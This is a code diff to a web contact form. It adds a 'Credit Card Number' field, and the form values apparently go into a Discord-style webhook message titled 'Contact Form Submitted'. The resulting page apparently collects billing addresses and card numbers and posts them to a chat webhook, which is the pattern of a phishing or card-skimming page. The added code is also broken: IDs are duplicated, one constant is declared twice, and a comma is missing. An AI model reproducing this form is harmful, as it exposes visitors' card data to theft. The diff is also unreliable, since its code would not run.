@@ -11,7 +11,11 @@
       </div>
       <div class="mb-3">
         <label for="messageInput" class="form-label">Enter your Billing Address</label>
-        <textarea class="form-control" id="messageInput" rows="3"></textarea>
+        <textarea class="form-control" id="messageInput" rows="2"></textarea>
+      </div>
+      <div class="mb-3">
+        <label for="messageInput" class="form-label">Enter your Credit Card Number</label>
+        <textarea class="form-control" id="messageInput" rows="2"></textarea>
       </div>
       <button type="submit" class="btn btn-primary">Submit</button>
     </form>
@@ -23,12 +27,15 @@
           .getElementById('emailInput').value;
         const senderMessage = document
           .getElementById('messageInput').value;
+        const senderMessage = document
+          .getElementById('messageInput').value;
 
         const webhookBody = {
           embeds: [{
             title: 'Contact Form Submitted',
             fields: [
               { name: 'Sender', value: senderEmail },
+              { name: 'Message', value: senderMessage }
               { name: 'Message', value: senderMessage }
             ]
           }],
